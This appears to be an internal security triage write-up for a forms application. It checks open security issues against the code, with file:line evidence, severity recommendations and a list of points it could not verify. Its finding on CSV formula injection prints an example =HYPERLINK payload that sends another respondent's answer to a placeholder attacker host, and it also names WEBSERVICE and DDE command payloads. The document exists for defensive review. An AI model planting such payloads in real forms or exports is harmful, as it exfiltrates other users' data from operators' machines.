# Task 040: security-finding triage input

**Prepared:** 2026-08-13 · **Verified against:** `origin/main` at `4ade1a1`
**Status:** working artifact in `plan/`. Not a decision, not a sign-off, not a deliverable of task 040.

## What this is, and what it is not

This is **the input 040 re-derives against, not the input 040 reads**. The Code Owner ruled on
2026-08-13 (issue #361) that 040 lists the open `security`-labelled issues and triages severity
itself at run time, because a hand-maintained list reads as current while being a snapshot. That
ruling stands and this document does not weaken it.

What this document adds is that 040 should not have to start from zero. Every issue below has been
read **against the code on `origin/main`**, not against its own text, and the verdict is recorded
with file:line evidence. Several premises did not survive that contact. Two findings have no issue
at all.

**This is explicitly not:**

- the security review document (040 writes that, as `docs/security-review-<date>.md`)
- a severity ruling (040 owns severity; these are recommendations with the reasoning attached)
- a current list (it went stale during its own preparation, see below)

**040 must re-run `gh issue list -R roonga/qcms --label security --state open` and reconcile.**
Proof that this is not pedantry: while this triage was being written, issue **#370** was closed by
PR #446 merging into `main` (commit `4ade1a1`, 2026-08-13 21:58 UTC). The open set changed under
the author's hands inside a single sitting. Treat every row below as evidence, not as inventory.

**Where this document recommends rather than reports, it says so inline.**

---

## Summary table

Eleven findings: nine issue-backed (the ten open `security` issues minus #361, which is the tracker
and not a finding), plus two that no issue covers.

| Issue | Finding (one line) | Shape | Severity | Reachable by default | Entanglement |
|---|---|---|---|---|---|
| *(none)* | Response CSV export has no formula-injection guard; the admin's link export does | Missing control | **HIGH** | **Yes** | 040 task file already names it (line 19); collides with `apps/api` slice work |
| #390 | better-auth sign-in throttle defaults off unless `NODE_ENV=production`; no boot signal | Insecure default shipped | **HIGH** | No in Docker, **yes** outside it | None open; needs a Code Owner decision (3 options) |
| #432 | No 2FA reset path exists, so a leaked `QCMS_ADMIN_AUTH_SECRET` version can never be retired | Missing control | **HIGH** | Yes (on the recovery path) | Premise partly refuted; unblocks SEC-7 key-list pruning |
| #305 | `redeliver`/`erase`/`unflag` take a client id with no form-scope check | Missing control (latent) | **MEDIUM** | Yes, but grants nothing extra today | Claimed on `fix/305-form-scope-check`; PR #454 also edits `registrars.ts` |
| #453 | SEC-7 and SEC-6 promise a webhook dual-signing window the deliverer does not implement | Documented vs shipped | **MEDIUM** | Yes (on rotation) | **PR #469 only partly fixes it** (see below) |
| #401 | `QCMS_SECURE_COOKIES` parses leniently in the portal, strictly in the admin | Insecure default / doc mismatch | **MEDIUM** | Yes | PR #451 vendors portal config into scaffold templates |
| #372 | Base images unpinned, no Dependabot docker coverage, no image scanning; SEC-11 claims otherwise | Documented vs shipped + missing control | **MEDIUM** | Yes | 040's own deliverable (task file line 18) |
| *(none)* | The API sets **no** security headers, while SEC-9 says it does and marks them delivered by 017 | Documented vs shipped | **MEDIUM** | Nil today by topology | Same family as #402 |
| #402 | The API is a third reader of the secure-cookie rule with no loopback guard | Missing control | **LOW** | Nil today by topology | Depends on #401's parsing ruling |
| #444 | `brace-expansion@5.0.8` and `nanoid@3.3.16` still resolve in the lockfile | Supply chain / signal defect | **LOW** (but see note) | N/A (unreachable) | **Blocks 040's exit criterion as literally worded** |
| #460 | Recommended manual `create-admin` recipes land the passphrase in shell history | Documented vs shipped | **LOW** | Yes | Mitigated by task 061 (forced password change) |

Counts: **3 high, 5 medium, 3 low.**

Two of the three highs have no open issue or a refuted premise, which is itself the finding: the
issue list is not a superset of the risk.

---

## High findings, with evidence

### H1. The response CSV export has no formula-injection guard (no issue exists)

**Evidence.**

`apps/api/src/features/responses/admin/csv.ts:52-57` is the whole escaping story for the response
export:

```ts
export function csvField(value: string): string {
  if (/[",\r\n]/.test(value)) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return value;
}
```

RFC 4180 quoting only. No leading-character guard. Respondent answer values reach it unmodified:
`csv.ts:98` maps every cell (metadata plus per-question answers) through `csvField` and joins.
`csv.test.ts:23-38` covers quoting and nothing else.

Now the same repo, `apps/admin/lib/forms/links.ts:31-43`:

```ts
/**
 * ... The leading-character guard is the
 * formula-injection one - a field starting `=`, `+`, `-` or `@` is executed by several
 * spreadsheet programs on open, so it is prefixed with a single quote.
 */
function csvField(value: string): string {
  const guarded = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
  return `"${guarded.replaceAll('"', '""')}"`;
}
```

**The guard exists, is written down, is understood, and is deployed on the one export whose content
is server-generated and structurally safe** (link ids and URLs, which the same comment notes
"contains no comma, quote or newline today"). It is absent from the one export whose content is
free text supplied by anonymous users of a public form.

`docs/features/040-security-review-hardening.md:19` already names this: *"CSV export
formula-injection guard (`=`, `+`, `-`, `@` prefixed cells escaped - add to 023's export if
missing)."* It is missing.

**Concrete consequence.** The portal is public and anonymous sessions are a launch mode
(`docs/SECURITY_DESIGN.md:63`). A respondent types `=HYPERLINK("https://attacker.example/?d="&A2,"Open")`
into any text answer. An admin exports responses to CSV and opens the file in Excel or LibreOffice.
The formula evaluates in the admin's spreadsheet, with the admin's network position, and the cells
it can reference are **other respondents' answers in the same sheet**. `=WEBSERVICE(...)` and DDE
payloads (`=cmd|'/c ...'!A0`) are the same door.

**What the attacker gets:** exfiltration of response data from an admin workstation, triggered by a
routine operator action, with no authentication and no account. Anyone who can submit the form can
attempt it.

**Why I am calling this high and not medium.** Modern Excel disables DDE by default and prompts
before enabling external content, so exploitation is not certain. But the brief's rule applies
squarely: the control is **absent**, not coarse. The input is fully attacker-controlled from the
open internet, the target is an authenticated operator, and the project has already decided
elsewhere that this guard is necessary. A finding where the codebase contains the fix, applied to
the wrong file, is not a judgement call.

**Recommendation (not a report):** port `links.ts`'s guard into `csv.ts` and give the response
export a test with a `=`-leading answer value. It is a same-area, small change.

### H2. #390: the sign-in throttle is off unless `NODE_ENV=production`, and nothing says so

**Evidence.**

`apps/api/src/features/auth/instance.ts` configures better-auth with **no `rateLimit` key at all**.
A repo-wide grep of `apps/api/` for `rateLimit` returns only QCMS's own unrelated per-endpoint
limiter (`apps/api/src/rate-limit.ts`, `apps/api/src/features/responses/rate-limits.ts`).

So the vendor default applies. In the pinned `better-auth@1.6.26`
(`apps/api/package.json:45`), `dist/context/create-context.mjs:171`:

```js
enabled: options.rateLimit?.enabled ?? isProduction,
```

and `@better-auth/core@1.6.26`'s `dist/env/env-impl.mjs:30-32` computes `isProduction` as
`env.NODE_ENV === "production"`, captured once at module load.

The repo knows this and depends on it: `apps/api/src/features/auth/sign-in-throttle.test.ts:29-34`
documents the module-load capture, and line 51 stubs `NODE_ENV=production` specifically to switch
the throttle on for the test.

`docs/SECURITY_DESIGN.md:39` states as delivered: *"Sign-in throttling: per-account and per-IP
exponential backoff."* The traceability row (`:206`) marks SEC-1 delivered by `031 · #178 · 040`.

**Concrete consequence.** An operator running the API process with `NODE_ENV` unset gets **no
brute-force limiter on admin sign-in**, silently. There is no warning, no log line, and no health
signal: `apps/api/src/main.ts:98-103` logs `port`, `mount` and `tracing` and nothing about abuse
controls.

**What the attacker gets:** unlimited password guessing against the one credential that reads every
respondent's answers and can publish forms. `docs/SECURITY_DESIGN.md:13` ranks admin credentials as
the second most valuable asset in the system.

**Reachability, stated honestly.** The three shipped Dockerfiles set `ENV NODE_ENV=production`
(`docker/api.Dockerfile:24`, `docker/admin.Dockerfile:24`, `docker/portal.Dockerfile:30`), so a
stock Compose deployment is throttled. The exposure is any deployment that runs the API outside
those images, which nothing in the docs forbids and which the shadcn-style distribution model makes
ordinary: the adopter owns the shell and runs it their way.

**Why high.** A control the security document lists as delivered, which is absent under a reachable
configuration, with no way for the operator to tell. That is the exact shape #361 identifies as the
most damaging to launch with, applied to authentication rather than to documentation.

**Note for 040:** the issue itself says the fix needs a decision, not a line, because switching it
on unconditionally throttles developers who all share one bucket. Three options are already
enumerated on the issue. **This one probably needs the Code Owner**, which matters for sequencing:
040 was described in #361 as the only 1.0 blocker the loop can progress without a human, and this
finding puts a decision inside it.

### H3. #432: there is no 2FA reset, and the real cost is that an auth-secret version can never be retired

**Evidence, and a correction to the issue's own framing.**

The gap is confirmed. `git grep` across `origin/main` for `reset-2fa`, `resetTwoFactor` and
`disable2fa` returns **zero hits**. The only operator CLI under `apps/api/src/` is
`create-admin.ts`, which refuses once any admin exists. There is no coded or documented path to
restore access to a locked-out administrator.

But the issue's stated *reason* is wrong, and `docs/SECURITY_DESIGN.md:144` already says so:

> There was never an accidental last door standing open behind a lost auth secret, which matters for
> how the break-glass gap is prioritised (issue #432): it is a real gap and not a newly created one.

Recovery codes were always stored encrypted (`apps/api/src/features/auth/instance.ts:381`,
`storeBackupCodes: "encrypted"`). #319 closed nothing, because there was nothing accidental to
close. See "premises that did not survive" below.

**So why is this still high?** Because the consequence that actually matters is not lockout, it is
key retirement. `docs/SECURITY_DESIGN.md:150-152` spells it out:

> The TOTP secret does not re-encode on use. It is written once at enrollment and only read
> afterwards ... Retiring an old version means re-enrolling accounts whose secret was written under
> it.
>
> A retired version is retired, and at launch there is no supported way to retire one. ... because
> TOTP secrets never migrate and the admin surface exposes no re-enrolment for an account with a
> live factor (`two-factor/disable` is unmounted), the list only grows. Pruning becomes possible
> once a 2FA reset exists (issue #432).

Combine that with the stored-secret threat model at `docs/SECURITY_DESIGN.md:55`: *"an attacker who
holds **both** a database read **and** `QCMS_ADMIN_AUTH_SECRET` recovers usable second factors."*

**Concrete consequence.** An operator whose `QCMS_ADMIN_AUTH_SECRET` leaks cannot fully rotate it.
They can prepend a new version to `QCMS_ADMIN_AUTH_SECRETS`, and recovery codes re-encode on
redemption, but every enrolled account's **TOTP secret stays encrypted under the leaked version
indefinitely**, and dropping that version bricks those accounts with no re-enrolment path. So the
leaked key remains usable against every pre-existing enrolment, forever, and no operator action
available at launch changes that.

**What the attacker gets:** an attacker who obtained a database read plus a since-"rotated" auth
secret retains working second factors for every account enrolled before the rotation. The rotation
the runbook describes does not revoke them.

**Confidence, stated.** I am less certain of this severity than of H1 and H2, and 040 should
re-derive it rather than inherit it. The argument for medium is that SEC-7's rotation is additive
and partially works, and that the residual requires the attacker to already hold a database read. I
am calling it high because the missing control converts a recoverable incident into an unrecoverable
one, and because incident response with no revocation path is the kind of gap that is discovered at
the worst moment by the person least able to fix it. **If 040 disagrees, the disagreement should be
recorded in the review doc rather than settled silently**, because SEC-7's rotation column is
already the part of `SECURITY_DESIGN.md` with the worst accuracy record (see #453 and #323).

---

## Medium findings, in brief

**#305 (`redeliver`/`erase`/`unflag`, no form-scope check).** Confirmed in code:
`apps/api/src/features/responses/admin/handler.ts:393-418` (erase) and `:453-489` (unflag) act on a
path `sessionId` with no form check; `apps/api/src/features/outbox/handler.ts:168-193` (redeliver)
the same on a delivery id. The `withScopes(...)` annotations on those routes
(`responses/admin/route.ts:125,158`) are **inert**: `apps/api/src/middleware/admin-auth.ts:88`
returns `scopes: [...SCOPES]` for every authenticated principal, and `apps/api/src/openapi.ts:121`'s
`withScopes` is OpenAPI metadata (the file header calls the scopes "SEC-5 metadata, inert at
launch").

**Severity medium, not high, and this is a deliberate departure from the brief's default.** Severity
is what an attacker gets, and today an authenticated admin already reaches every form's responses
through documented routes, because SEC-3 ships exactly one role
(`docs/SECURITY_DESIGN.md:103`). The missing check grants nothing that is not already granted. It
becomes high on the day any role differentiation ships, which is precisely what the Code Owner's
2026-08-13 option-A ruling (form-scoped routes) is designed to pre-empt. It is claimed on
`fix/305-form-scope-check` and will most likely land before 040 starts.

**#453 (webhook dual-signing).** Confirmed: `docs/SECURITY_DESIGN.md:133` promises a "dual-signing
window", `:97` promises "old+new both signed during a documented window", and the deliverer sets
exactly one header (`apps/api/src/schedulers/outbox-delivery.ts:290-297`). `signWebhookBody` takes a
single `secret: string` (`apps/api/src/features/webhooks/signing.ts:36-49`) and the `webhooks` table
has one secret column and no overlap or expiry column (`packages/db/src/schema/webhooks.ts:26-38`).

**Entanglement, and it matters: PR #469 does not close this.** #469 touches
`docs/SECURITY_DESIGN.md` only, correcting the §4 table cell at line 133 to say "hard cutover, no
overlap" and adding an accurate explanatory note. Its corrections check out against the code. But
after it merges, **two other passages still promise dual-signing**: `docs/SECURITY_DESIGN.md:97`
(§2.5, SEC-6) and `docs/webhooks.md:47-49`, which defers the overlap to task 025 as a "delivery-time
concern". 040 should either land those two edits or record #453 as still open after #469.

**#401 (cookie flag parsing divergence).** Confirmed.
`apps/portal/lib/server/config.ts:59-64` accepts only the exact strings `"true"` and `"false"`,
untrimmed and case-sensitive, and silently falls back to `NODE_ENV` for anything else.
`apps/admin/lib/server/config.ts:63-70` (`boolEnv`) trims, lower-cases, accepts eight spellings and
**throws**. `apps/api/src/config.ts:503-511` (`parseBool`) matches the admin's acceptance set and
collects an issue that becomes a `ConfigError` at boot. The lenient behaviour is pinned by
`apps/portal/lib/server/config.test.ts:68-74`, which is the `config.test.ts:69` the issue names.

What keeps this out of high is PR #400's boot refusal
(`apps/portal/lib/server/config.ts:142`, `apps/admin/lib/server/config.ts:216`): the dangerous
direction, an operator writing a spelling the admin accepts (`on`) and the portal discards while
`NODE_ENV` is not production, produces `secureCookies() === false`, which the guard refuses at a
non-loopback origin. The residual is an operator who is told the wrong thing and two apps that
disagree, plus a secondary asymmetry PR #411 introduced: the portal quotes the observed value
untrimmed (`config.ts:167-171`) and the admin trims it (`config.ts:230-234`).

**#372 (base images, Dependabot, image scanning).** Confirmed on every sub-claim. All six `FROM`
lines in `docker/*.Dockerfile` are floating tags, none digest-pinned
(`docker/{admin,api,portal}.Dockerfile:2,16` / `:2,22`). `.github/dependabot.yml` configures
`github-actions` and `npm` only, with no `docker` or `docker-compose` ecosystem. A grep of
`.github/` for trivy, grype, scout, osv-scanner and syft finds **only** an SBOM step
(`.github/workflows/images.yml`), so there is no container-image vulnerability scanning at all.

`docs/SECURITY_DESIGN.md:198` asserts four things; two are false: **"pinned base digests"** is
false, and **"`pnpm audit` + osv-scanner in CI"** is half false (`.github/workflows/audit.yml:29`
runs `pnpm audit`; osv-scanner exists nowhere in `.github/`). "non-root" and "SBOM" are true. The
Code Owner ruled on 2026-08-07 that this is not a 1.0 blocker and that 040 is its home, with the
strict ordering constraint that pinning and Dependabot land together. **The two false claims should
be corrected regardless of whether the pinning work happens**, and `packages/db/src/testing/harness.ts:95-100`
carries a smaller version of the same conflation, calling a tag reference "pinned".

**The API sets no security headers (no issue exists).** `docs/SECURITY_DESIGN.md:162` reads
*"**Headers** (both Next apps + API): CSP ..., `X-Content-Type-Options: nosniff`,
`Referrer-Policy: strict-origin-when-cross-origin`, `frame-ancestors 'none'`"* and marks them
*"Delivered: 017 (API headers/limits)"*. `apps/api/src/middleware/` contains exactly five files
(`admin-auth`, `error-envelope`, `internal-token`, `request-logger`, and one test); a grep of
`apps/api/src/` for `X-Content-Type-Options`, `Referrer-Policy`, `secureHeaders` and
`frame-ancestors` returns **zero hits**; and `apps/api/src/app.ts:101-107` installs only
instrumentation, the request logger and the body limit.

The practical exposure is nil, because the API container publishes no port and no ingress recipe
routes it (ADR-20). But this is the third instance of one pattern in this triage: a security
document asserting an API-side control that does not exist, justified after the fact by topology
(compare #402, and #372's SEC-11 line). I verified this by absence rather than at runtime; 040
should confirm against a running process before acting on it.

---

## Low findings, in brief

**#402 (API is a third reader of the secure-cookie rule).** Confirmed, with the line number drifted:
the read is now at `apps/api/src/config.ts:670-674` inside `parseAdminAuth()`, not `:504` (which is
now `parseBool`'s body). No loopback guard exists in the API and no comment there records the
dependency. The dependency **is** documented, but only from the other side, in
`apps/admin/lib/server/config.ts`'s `assertSecureCookiesConfigured` doc comment, which explicitly
states the API has no independent guard and why extending it was deferred. The value flows to
`apps/api/src/features/auth/instance.ts:344` as better-auth's `useSecureCookies`. Harmless today by
R2 topology; the finding is the invisibility of the exemption, not a live weakness.

**#444 (`pnpm audit`).** Confirmed mechanically. `pnpm-lock.yaml` still resolves
`brace-expansion@5.0.8` (via `minimatch@10.2.5`) alongside the clean `5.0.9`, and `nanoid@3.3.16`
(via `postcss@8.5.23`) alongside the clean `3.3.18`. Neither package is imported directly anywhere
in `packages/`, `apps/`, `scripts/` or `tooling/`, and neither appears in any `package.json`. Real
exploitability here is nil.

**Two premise problems worth 040's attention, both in `CONTRIBUTING.md`'s overrides table.**
`CONTRIBUTING.md:92` justifies the `postcss: ^8.5.23` override on the grounds that *"the whole tree
dedupes onto one postcss 8 instance"*. It does not: `^8.5.23` is satisfied by both `8.5.23` and
`8.5.26`, so pnpm keeps both, which is exactly the condition #444 reports. And `CONTRIBUTING.md:94`
states the brace-expansion advisory range as `<= 5.0.7` while #444 reports `>=4.0.0 <5.0.9`; one of
the two is wrong and 040 should establish which. The overrides table is described in `CLAUDE.md` as
the removal-condition ledger, so an inaccurate justification in it is a durable defect, not a typo.

**The severity label is doing two jobs and 040 must separate them.** As a risk this is low. As a
**process** matter it is blocking, because 040's exit criterion 3 is "zero open high-severity
findings" and both advisories are rated high upstream. The 2026-08-13 triage comment on #444 makes
the right call and is worth carrying into the review doc verbatim: *"unreachable is not the same as
fixed, and the criterion is about open high-severity findings, not exploitable ones."* The dedupe is
a lockfile change with no API surface and is cheaper than a waiver, which would be a permanent
maintenance obligation.

**#460 (passphrase in shell history).** Confirmed. `apps/api/src/create-admin.ts` has no
`process.argv` parsing at all, no stdin and no prompt (`:56-64` reads the environment and prints a
usage line). Every recommended recipe uses the inline `VAR=value command` form, which an interactive
shell records: `apps/api/src/create-admin.ts:7`, `apps/admin/README.md:53-55` and `:109-110`,
`docs/DEVELOPER_GUIDE.md:89-90`, `docs/operations.md:161`, `docs/deploy-enterprise.md:156`. #440 and
PR #459 fixed only the Docker Compose argv leak, which is a different exposure, so the docstring's
claim at `:10-12` stays literally true while the recipe beneath it does the thing the claim warns
about.

Severity low, and lower than when it was filed: task 061 landed (commit `14a81ff`, "force a password
change on first sign-in after bootstrap"), so a bootstrap passphrase recovered from shell history is
useful only before the first sign-in. **040 should confirm that mitigation** rather than take it from
here; I read the commit subject, not the implementation.

---

## Premises that did not survive verification

Four, and they run in both directions.

**1. #432's causal claim is refuted.** The title asserts *"#319 closes the accidental one"* and the
body asserts *"recovery codes are stored in plaintext, so an operator who has lost access can read
them out of the database."* Both are false and were false when filed.
`apps/api/src/features/auth/instance.ts:367-382` sets `storeBackupCodes: "encrypted"`, and
`docs/SECURITY_DESIGN.md:142-144` records the original error in detail: it came from reading
better-auth's decoder without reading the caller that supplies the option, which defaults to
`"encrypted"`. There was never a plaintext door and #319 closed nothing.

**The gap #432 describes is nonetheless real**, and this triage rates it high (H3) on a completely
different consequence than the one the issue argues. That is the useful part: had 040 triaged from
the issue text, it would have either dismissed the issue with the premise or accepted a prerequisite
relationship to #319 that does not exist.

**2. #370's described work is done, by a different mechanism, and the issue is now closed.** The
issue asks to *"flip `disableLogSending`"*. At `origin/main` there is no `PinoInstrumentation` and no
`disableLogSending` anywhere in the repo: task 062 removed pino from the OTel path entirely and
wired a `LoggerProvider` directly (`apps/api/src/telemetry.ts:154-157`). The SEC-13 amendment the
issue required rode with it (`docs/SECURITY_DESIGN.md:184-194`,
`apps/api/src/telemetry-redaction.ts:20-27`), and `msg` is governed by an exact-string allowlist
rather than exported freely (`packages/observability/src/otlp-log-allowlist.ts:3,18,35-43`). This
landed as commit `4ade1a1` during the preparation of this document.

**3. #402's line citation has drifted** (now `apps/api/src/config.ts:670-674`, not `:504`). Trivial,
but it is the second issue in this set whose file:line no longer resolves, so 040 should re-locate
rather than trust any citation, including the ones in this document.

**4. `CONTRIBUTING.md:92`'s dedupe claim is false**, as above. This is not a finding about a
dependency; it is a finding about the ledger that is supposed to govern dependencies.

**One near-miss worth recording.** #444's own 2026-08-13 triage comment is correct and was verified
rather than assumed: `nanoid` is genuinely unreachable, no QCMS source imports it, and the alert is
real as a supply-chain fact while being unexploitable here. That analysis stands.

---

## Composition-level checks that no issue covers

This is the section a per-issue list structurally cannot contain, and #361 names why: #341 hid at
this level, where every component behaved as written and the composition did not. Nine seams, in
rough priority order. Items marked *recommendation* are proposals, not findings.

**C1. The authorization matrix suite does not exist, and it is 040's largest deliverable.**
`docs/SECURITY_DESIGN.md:120` states *"Enforcement tests for this matrix are part of 040"*, and the
task file's first deliverable is `apps/api/e2e/security/`. That directory does not exist:
`apps/api/e2e/` holds five scenario files (`01-full-loop`, `02-anonymous`, `03-version-pinning`,
`04-mount-split`, `05-failure-tour`) plus support. Every cell of the §3.2 matrix at
`docs/SECURITY_DESIGN.md:109-119` currently rests on per-slice tests, not on a matrix probe. No
issue tracks this because it was never a defect, it was always scheduled work, which is exactly why
a "list of open issues" cannot surface it.

**C2. A control present in one app and absent in its twin.** H1 is the concrete instance found:
`apps/admin/lib/forms/links.ts:40-43` guards CSV formula injection on safe data;
`apps/api/src/features/responses/admin/csv.ts:52-57` does not, on attacker-controlled data.
*Recommendation:* 040 should treat "twin asymmetry" as a search pattern rather than a one-off, since
this triage found four instances of it in different territories (the CSV guard; #401's parsers;
#402's two-of-three readers; PR #411's trim/no-trim message asymmetry between
`apps/portal/lib/server/config.ts:167-171` and `apps/admin/lib/server/config.ts:230-234`).

**C3. The admin-gate ordering invariant is asserted in seven places and pinned in one.**
`apps/api/src/registrars.ts:34-36` states *"`registerAdminAuth` MUST be first in `admin`"*, and six
route files repeat it (`features/forms/route.ts:289`, `links/route.ts:85`, `outbox/route.ts:88`,
`questions/route.ts:203`, `responses/admin/route.ts:163`, `webhooks/route.ts:110`). The per-slice
`admin-mount.test.ts` files cannot detect a regression in that list, because they build their own
two-element ordering: `apps/api/src/features/responses/admin/admin-mount.test.ts:21` is
`{ groups: { admin: [registerAdminAuth, registerAdminResponses] } }`. The one test that composes the
real `appGroups` is `apps/api/src/features/auth/auth.integration.test.ts:150`, which asserts a 401
after sign-out at `:381`. 040 should **verify that a reordering of `registrars.ts` actually turns
something red**, rather than infer it. If it does not, this is a comment asserting a property nothing
checks, which is the pattern #361 says the project keeps finding and rejecting.

**C4. The vouched client-address chain has three hops and only the middle one is checkable.**
`apps/api/src/client-address.ts:1-37` documents the model, and the composition is sound: every
mounted group is behind the SEC-4 internal token (`apps/api/src/app.ts:124`), so asserting
`X-QCMS-Client-Address` presupposes the deployment's internal token, and the fail-safe direction is
one shared bucket rather than one bucket per request (`client-address.ts:56-58`). The residual is
documented at `docs/SECURITY_DESIGN.md:180`: a hop count **higher** than the real proxy count makes
the resolver read client-supplied text, and that is undetectable from inside the process. The
mitigation proposed in a #361 comment, a boot log naming the trusted hop count, **does not exist**:
`apps/api/src/main.ts:98-103` logs `port`, `mount` and `tracing`, and neither
`apps/portal/instrumentation.ts` nor `apps/admin/instrumentation.ts` logs
`QCMS_PORTAL_TRUSTED_PROXY_HOPS` or `QCMS_ADMIN_TRUSTED_PROXY_HOPS`. It logs configuration, not an
address, so SEC-13 is untouched. *Recommendation:* 040 should decide this rather than leave it in a
comment thread, since it is the only in-process detection surface the design admits.

**C5. Every rate limit is per-process, and the security document does not say so.**
`apps/api/src/rate-limit.ts:54-55` is an in-memory fixed-window store, described as "the
single-process default" with a shared store as an adopter swap. §8's placement rule
(`docs/SECURITY_DESIGN.md:174`) says nothing about replica count. Two API replicas means every
documented limit is effectively doubled, and better-auth's throttle store has the same property.
040 should record what SEC-1's and 026's limits actually mean in the shipped single-replica Compose
versus any scaled deployment, because an adopter who scales horizontally silently weakens every
abuse control.

**C6. After 037 lands, the artifact adopters run is a second copy of the security surface.**
PR #451 vendors `apps/admin`, `apps/portal` and `docker/` into
`packages/create-qcms-app/templates/`, including the auth screens, the two-factor routes, the export
route and the Dockerfiles. The mechanism is sound: `packages/create-qcms-app/scripts/sync-templates.mjs`
generates the tree by declared transforms and doubles as a gate, and `pnpm check:templates` runs in
CI (`.github/workflows/ci.yml:133` on that branch). But 040 verifies "the system", and the system an
adopter runs will be the generated tree. **040 should state which tree it verified**, and should
confirm the drift gate is genuinely the only thing keeping the two equal. 040's own deliverable
"scaffold-output secret scan wired into 037's CI if 037 shipped" (task file line 16) goes live the
moment #451 merges, which is entanglement in the scheduling sense: 040's scope changes depending on
merge order.

**C7. SEC-13 now governs two exported signals, and the newest one has had the least review.** Task
062 merged hours before this triage was drawn. The log allowlist is an **exact-string** set of known
`msg` values (`packages/observability/src/otlp-log-allowlist.ts:3`), and anything unrecognised has
its body replaced with `application.event` (`:35-36`). That is the right fail direction for privacy
and a silent one for observability: a new log call site with a new message loses its body in the
exported signal with no error. 040 should check that failure mode deliberately, and should restate
what "logs across service boundaries" means, since the portal and admin have no logger, so it means
one service's logs correlated to a cross-boundary trace.

**C8. SEC-8's placeholder-refusal claim is unverified and may be a fourth documented-vs-shipped
instance.** `docs/SECURITY_DESIGN.md:166` says *"a deployment with placeholder secrets must refuse to
boot."* Grepping `apps/api/src/config.ts` for `placeholder`, `change-me` and `CHANGEME` returns
nothing, and validation appears to be length-based only, so a 32-character placeholder would boot.
The claim's stated subject is the 037 scaffold's `.env.example`, which does not exist on `main`
(the repo root `.env.example` carries only `DATABASE_URL`) and arrives with PR #451 as
`templates/common/_env.example`. 040 must establish whether the control exists, and if not, whether
the sentence or the software changes.

**C9. The byte-versus-character conflation is live in code on two constants, not one.** #361's
2026-08-13 comment reports `APP_KEY_MIN_LENGTH`'s docstring. Both are affected:
`apps/api/src/config.ts:31` reads *"Minimum **bytes** for signing/secret material"* and `:33` reads
*"32 **bytes** = 256 bits"*, on constants whose consumer compares `raw.length`, i.e. characters. A
31-character key is refused whatever its byte count and a 32-character non-ASCII key is accepted
though it exceeds 32 bytes. Small, but it is a security floor described in the wrong unit in the
config module that enforces it, and no issue covers it.

---

## What I could not verify

Stated as unverified, not assumed. Each of these is a gap in this document, not a finding.

1. **Whether `pnpm audit` currently reports the two #444 advisories.** This checkout cannot run
   pnpm. The lockfile resolutions were read statically; the advisory ranges come from the issue text
   and were not independently checked against the GHSA records.
2. **Which of `CONTRIBUTING.md:94` (`<= 5.0.7`) and #444 (`>=4.0.0 <5.0.9`) states the correct
   brace-expansion advisory range.** They disagree and I did not resolve it.
3. **Whether the H1 payloads actually execute** in the Excel and LibreOffice versions an operator
   would plausibly use. No spreadsheet was available. The severity rests on the control being absent
   and on the repo's own prior judgement that the guard is necessary, not on a demonstrated
   exploit.
4. **Whether the C3 ordering invariant is genuinely caught by a test.** Establishing it needs a
   deliberate reordering plus a suite run, which this seat does not do.
5. **Whether SEC-9's headers are absent at runtime**, as opposed to absent from the source I
   grepped. Verified by absence across `apps/api/src/middleware/`, `apps/api/src/app.ts:101-107` and
   a targeted grep; not verified against a running process, and not checked for a reverse proxy or
   framework default that might supply them.
6. **SEC-10 (least-privilege DB roles) was not inspected at all.** It is a 040 deliverable (task file
   line 17) and no open issue touches it, so it is a blind spot in this triage rather than a clean
   bill.
7. **SEC-9's cookie flags, CSRF (Origin / Sec-Fetch-Site) enforcement and the no-CORS-headers
   assertion** were not verified; only the secure-cookie configuration path was, via #401 and #402.
8. **Task 061's forced password change** was read from a commit subject only, so the #460 mitigation
   is asserted on weaker evidence than the rest of this document.
9. **better-auth's internals** were read from a `node_modules` tree in this checkout, which is
   host-side and may not match what CI or a container resolves. The version was corroborated from
   `apps/api/package.json:45` and the behaviour from
   `apps/api/src/features/auth/sign-in-throttle.test.ts:29-34`, which is first-party evidence, but
   040 should confirm against a fresh install.
10. **Whether any of the four open PRs (#446 excepted, now merged) will land before 040 starts.**
    Every entanglement note in this document assumes today's merge state and will need re-checking.
